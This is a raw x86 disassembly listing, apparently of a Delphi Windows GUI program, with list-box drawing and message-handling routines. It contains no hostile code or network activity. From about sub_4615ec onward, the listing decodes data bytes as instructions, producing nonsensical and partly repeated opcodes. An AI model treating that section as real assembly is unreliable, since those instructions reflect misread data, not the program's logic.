mov eax [ ebp - 0x4 ]
call sub_494494
push ebp
call sub_460854
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_460aa4
push ebx
add esp 0xffffffdc
mov ebx eax
mov [ esp + 0x14 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_48dac0
movzx eax [ esp + 0x8 ]
mov [ esp + 0x10 ] ax
movzx eax [ esp + 0xc ]
mov [ esp + 0x12 ] ax
mov eax [ esp + 0x10 ]
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov [ esp + 0x20 ] eax
lea edx [ esp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x14 ] 0x202
lea edx [ esp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x24
pop ebx
retn
sub_460b10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_460c41
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x280 ]
call sub_46e300
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c48
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edx 0x824
mov eax ebx
call sub_490a7c
mov [ ebp - 0x8 ] eax
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x270 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_461194
jmp r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebx + 0x280 ]
call sub_46e8c8
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push ebx
call DrawTextW
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_460c74
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
movzx ebp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x280 ]
call sub_46e950
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x280 ]
call sub_46e7e4
mov edx [ esi + 0x1b8 ]
mov eax [ esi + 0x280 ]
call sub_46e800
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x280 ]
call sub_46e300
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
mov eax [ esi + 0x280 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ esi + 0x280 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_46d5ac
xor edx edx
mov eax [ esi + 0x280 ]
call sub_46e950
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_460d30
push ebx
push esi
push ecx
mov edx [ edx + 0x8 ]
mov ebx edx
mov edx [ eax + 0x288 ]
mov [ ebx + 0x10 ] edx
cmp [ eax + 0x290 ] 0x2
jne r-xdata
pop edx
pop esi
pop ebx
retn
mov [ esp ] edx
mov ecx esp
mov edx [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0x110 ]
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
sub_460d64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
cmp [ ebx + 0x27c ] 0x1
jne r-xdata
mov eax ebx
call sub_492ec4
sub_460d90
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x260 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_460008
inc edi
dec ebx
jne r-xdata
sub_460dc8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
or ecx 0xffffffff
mov edx 0x18f
call sub_41f080
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x274 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4611e0
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax ]
sub ax 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x260 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub ax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_4483f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
movzx esi bx
mov eax esi
shl esi 0x10
or eax esi
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
push eax
call SendMessageW
sub ax 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_460eb0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_461092
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_4956ec
mov eax [ esi ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461099
lea eax [ ebp - 0x30 ]
mov edx 0x3
call j_sub_44936c
retn
call GetTickCount
mov edx [ esi ]
sub eax [ edx + 0x278 ]
mov edx [ esi ]
cmp eax [ edx + 0x2d0 ]
jb r-xdata
call GetTickCount
mov edx [ esi ]
mov [ edx + 0x278 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp ax 0x8
je r-xdata
mov eax [ esi ]
add eax 0x274
xor edx edx
call sub_449d2c
mov eax [ esi ]
mov eax [ eax + 0x274 ]
call sub_449fc4
mov edx eax
mov eax [ esi ]
mov eax [ eax + 0x274 ]
call sub_43a904
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp ax 0xd800
jb r-xdata
mov eax [ esi ]
mov ebx [ eax + 0x274 ]
test ebx ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x274 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
cmp ax 0xdfff
jbe r-xdata
mov eax [ esi ]
add eax 0x274
mov ecx 0x1
mov edx ebx
call sub_44a438
sub ebx 0x4
mov ebx [ ebx ]
mov edx [ esi ]
add edx 0x274
mov ecx 0x1
xchg edx eax
call sub_44a438
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
mov al 0x1
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx ]
call sub_449e98
mov edx [ ebp - 0x30 ]
mov eax [ esi ]
add eax 0x274
call sub_44a068
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ esi ]
call sub_496868
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageW
test eax eax
je r-xdata
xor edx edx
mov eax [ esi ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi ]
mov si 0xffeb
call sub_4483f8
push ebp
call sub_460dc8
pop ecx
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x274 ]
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax + 0x274 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx ]
call sub_449e98
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_449e98
push [ ebp - 0x2c ]
mov eax [ esi ]
add eax 0x274
mov edx 0x3
call sub_44a1b8
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_4610b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461185
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_496868
push eax
call SendMessageW
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46118c
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
mov [ ebx + 0x26c ] esi
jmp r-xdata
sub_4611b4
push ebx
push ecx
xor ecx ecx
mov [ esp ] ecx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4611e0
push ebx
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
pop ebx
retn
sub_461220
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461204
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_46124c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_461271
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461278
retn
sub_461284
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4612b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612bc
retn
mov eax [ rw-data ]
call sub_4481b0
sub_4615ec
sbb al 0xeb
inc edx
add ah dl
sub eax [ esi ]
push eax
jmp r-xdata
sub al 0x46
add [ esp + ebp + 0x46 ] bl
add [ eax + 0x7c004514 ] dl
sub al 0x46
add [ eax - 0x63ffbaec ] bl
adc al 0x45
add [ eax - 0x43ffb9d4 ] bl
sub al 0x46
add ah bl
sub al 0x46
add ah bh
sub al 0x46
add al bl
sub [ esi ] eax
andps xmm1 [ ebp + 0x65 ]
outsb
jne r-xdata
cld
jmp 0xffffffff84aa16f4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x17
inc esi
add [ eax + 0x17 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
pop ss
inc esi
add [ edx + 0x17 ] bl
inc esi
add [ eax + eax + 0x2cc00000 ] dh
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
sub_4618a3
inc esp
add [ eax ] bh
add bh bh
les ebp [ ecx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
dec ebp
outsb
jne r-xdata
push esi
inc esp
add [ ecx ] bh
add [ eax ] al
jmp [ eax + 0x66 ]
dec ecx
outsb
js r-xdata
test [ esi + 0x44 ] dl
add [ ebx ] bh
add [ eax ] al
[ eax ]
insd
popad
jae r-xdata
add [ eax + 0x530d000a ] al
jne r-xdata
adc al 0x42
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
call [ eax + ebp * 2 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ edi ] al
inc esp
popa
jne r-xdata
push esi
inc esp
add [ esi ] dh
add [ eax ] al
jmp [ ecx + 0x10046 ]
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
add [ ecx ] cl
push edx
popad
imul ebp [ fs : edi + 0x49 ] 0xd86d6574
adc al 0x42
outsd
dec ecx
je r-xdata
xchg esp eax
push 0x46
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
les edx [ esi + 0x44 ]
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax + ebp * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
cmp al 0x0
add bh bh
fsub [ eax + 0x46 ]
add [ eax + ebp * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esi
inc esp
add [ 0xffffffffb0ff0000 ] dh
pop edi
inc esi
add [ eax + ebp * 2 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax + eax ] bl
insd
fcom [ edx + eax * 2 ]
cwde
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
inc edx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
sbb [ esi + 0x44 ] dl
add [ edx ] bh
add [ eax ] al
dec esp
pushad
inc esi
add [ eax + ebp * 2 + 0x46 ] dh
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf0656c62
adc al 0x42
add [ eax - 0x77010000 ] cl
add [ eax ] al
call esp
push 0x46
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
add [ 0x654d6e4f ] cl
popad
je r-xdata
add ah bh
add [ eax + eax + 0x4c ] 0x84
inc esp
ja r-xdata
or bh ah
inc edx
jb r-xdata
cmp [ ebx ] bl
inc esi
add [ eax + 0x1b ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cmp [ esi + eax * 2 ] dl
add [ eax - 0x67010000 ] bl
add [ edx + 0x1b ] cl
inc esi
add [ ebx + ebx + 0x46 ] ah
add [ eax + eax ] bl
add al al
sub al 0x42
je r-xdata
inc edx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] al
call 0xffffffffea5a1b5c
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esp + esi * 2 ] dl
inc esi
add [ edi + edi * 2 + 0x75180046 ] bl
inc esi
add ah cl
jg r-xdata
inc edx
add al al
dec ecx
je r-xdata
jmp 0xffffffff84aa1b24
jae r-xdata
insd
mov al 0x14
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
pop ss
inc esi
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ edi + edx + 0x46 ] ah
dec ebp
inc edx
add [ edi + edi * 2 - 0x7fafffba ] dh
inc esi
add [ eax ] cl
out 0x42 eax
insd
nop
nop
nop
cld
sbb al [ esi ]
add [ eax ] dl
add [ eax ] al
add al 0x0
stc
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
les edx [ esi + 0x44 ]
nop
nop
add al 0x1c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] al
inc esi
add [ eax + eax ] ah
add [ edx + ebx - 0x7d93ffba ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84aa1c2c
sub_461916
pushad
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
inc esp
add [ ecx ] bh
add [ eax ] al
jmp [ eax + 0x66 ]
dec ecx
outsb
js r-xdata
add [ eax + 0x530d000a ] al
jne r-xdata
adc al 0x42
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
call [ eax + ebp * 2 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
add [ eax ] al
dec ebp
outsb
jne r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
test [ esi + 0x44 ] dl
add [ ebx ] bh
add [ eax ] al
[ eax ]
insd
popad
jae r-xdata
add [ ecx ] cl
push edx
popad
imul ebp [ fs : edi + 0x49 ] 0xd86d6574
adc al 0x42
outsd
dec ecx
je r-xdata
js r-xdata
add [ edi ] al
inc esp
popa
jne r-xdata
push esi
inc esp
add [ esi ] dh
add [ eax ] al
jmp [ ecx + 0x10046 ]
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax + eax ] bl
insd
fcom [ edx + eax * 2 ]
xchg esp eax
push 0x46
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
les edx [ esi + 0x44 ]
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax + ebp * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
cmp al 0x0
add bh bh
fsub [ eax + 0x46 ]
add [ eax + ebp * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
cmp bh 0xff
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
cwde
inc ebx
jne r-xdata
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esi
inc esp
add [ 0xffffffffb0ff0000 ] dh
pop edi
inc esi
add [ eax + ebp * 2 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
inc edx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
sbb [ esi + 0x44 ] dl
add [ edx ] bh
add [ eax ] al
dec esp
pushad
inc esi
add [ eax + ebp * 2 + 0x46 ] dh
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf0656c62
adc al 0x42
add [ eax - 0x77010000 ] cl
add [ eax ] al
call esp
push 0x46
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
or bh ah
inc edx
jb r-xdata
cmp [ ebx ] bl
inc esi
add [ eax + 0x1b ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cmp [ esi + eax * 2 ] dl
add [ eax - 0x67010000 ] bl
add ah bh
add [ eax + eax + 0x4c ] 0x84
inc esp
ja r-xdata
inc edx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] al
call 0xffffffffea5a1b5c
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esp + esi * 2 ] dl
inc esi
add [ edi + edi * 2 + 0x75180046 ] bl
inc esi
add ah cl
jg r-xdata
inc edx
add al al
dec ecx
je r-xdata
add [ edx + 0x1b ] cl
inc esi
add [ ebx + ebx + 0x46 ] ah
add [ eax + eax ] bl
add al al
sub al 0x42
je r-xdata
pop ss
inc esi
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ edi + edx + 0x46 ] ah
dec ebp
inc edx
add [ edi + edi * 2 - 0x7fafffba ] dh
inc esi
add [ eax ] cl
out 0x42 eax
insd
nop
nop
nop
cld
sbb al [ esi ]
jmp 0xffffffff84aa1b24
jae r-xdata
insd
mov al 0x14
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax ] dl
add [ eax ] al
add al 0x0
stc
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
les edx [ esi + 0x44 ]
nop
nop
add al 0x1c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] al
inc esi
add [ eax + eax ] ah
add [ edx + ebx - 0x7d93ffba ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84aa1c2c
sub_461d08
inc esp
add [ eax + eax ] al
call [ eax + eax * 4 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
insd
popad
jae r-xdata
add [ ecx ] cl
dec edi
ja r-xdata
push esi
inc esp
add [ eax + eax ] bh
add bh bh
aam 0x7e
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
add [ eax ] al
add [ eax + 0x600461d ] bl
jo r-xdata
jb r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
pushfd
sbb eax 0xf030046
push esp
push eax
outsd
jo r-xdata
jb r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
sbb al 0x1e
jo r-xdata
outsb
je r-xdata
ja r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cwde
sbb eax 0x70060046
popad
add [ esi ] cl
push eax
popad
jb r-xdata
push esi
inc esp
add [ 0xffffffff8cff0000 ] bh
test [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
push cs
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffb974 ] dl
dec esi
inc edx
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ edi + edi * 2 - 0x7fafffba ] dh
inc esi
add [ eax ] cl
out 0x42 eax
add [ eax ] al
call 0xffffffffea5a1f54
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] bl
mov [ esi ] es
pushfd
jg r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
sbb [ esi ] bl
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
je r-xdata
outsb
je r-xdata
jmp [ eax ]
add [ eax ] bl
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
push ds
inc esi
add [ eax + 0x1ef49090 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
fcomp [ 0xc030046 ]
push esp
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
inc edx
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x1d ] cl
inc edx
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7465646f
adc eax [ esi ]
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc [ ecx ]
add [ eax ] al
add ah cl
jg r-xdata
outsd
test [ esi ] bl
